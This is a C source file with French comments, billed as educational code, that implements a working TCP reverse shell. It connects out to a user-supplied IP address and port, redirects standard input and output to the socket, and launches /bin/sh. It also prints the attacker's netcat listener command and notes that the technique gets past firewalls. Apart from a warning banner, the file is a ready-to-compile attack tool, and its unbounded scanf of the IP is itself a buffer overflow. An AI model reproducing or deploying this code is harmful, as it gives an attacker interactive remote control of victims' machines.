/*
 * ⚠️ AVERTISSEMENT : Code éducatif de reverse shell INTENTIONNEL
 * Uniquement sur tes propres systèmes de test. Usage malveillant est ILLÉGAL.
 *
 * Démonstration de reverse shell TCP.
 * Compilation : gcc example.c -o example
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

void demo_reverse_shell() {
    printf("\n=== Reverse Shell ===\n");
    printf("Avant de lancer, démarre un listener :\n");
    printf("  nc -lvp 4444\n\n");
    
    char ip[50];
    int port;
    
    printf("IP cible (ex: 127.0.0.1) : ");
    scanf("%s", ip);
    printf("Port (ex: 4444) : ");
    scanf("%d", &port);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return;
    }
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);
    
    printf("Connexion à %s:%d...\n", ip, port);
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        perror("connect");
        close(sock);
        return;
    }
    
    printf("Connecté! Lancement du shell...\n");
    
    // Rediriger stdin/stdout/stderr vers le socket
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    // Lancer le shell
    execve("/bin/sh", NULL, NULL);
    
    // Pas atteint si execve réussit
    close(sock);
}

void info() {
    printf("\n=== Information ===\n");
    printf("Reverse shell : connexion sortante de la victime vers l'attaquant.\n");
    printf("Bypass les firewalls qui bloquent les connexions entrantes.\n\n");
    
    printf("Étapes:\n");
    printf("1. Attaquant écoute : nc -lvp 4444\n");
    printf("2. Victime exécute le reverse shell\n");
    printf("3. Shell interactif obtenu par l'attaquant\n\n");
    
    printf("En C :\n");
    printf("  socket() -> connect() -> dup2() -> execve()\n");
}

int main() {
    int choice;

    printf("⚠️  CODE ÉDUCATIF - REVERSE SHELL\n\n");

    while (1) {
        printf("\n1. Lancer reverse shell\n2. Information\n0. Quit\nChoix : ");
        scanf("%d", &choice);
        getchar();

        switch (choice) {
            case 1: demo_reverse_shell(); break;
            case 2: info(); break;
            case 0: return 0;
            default: printf("Choix invalide.\n");
        }
    }
    return 0;
}
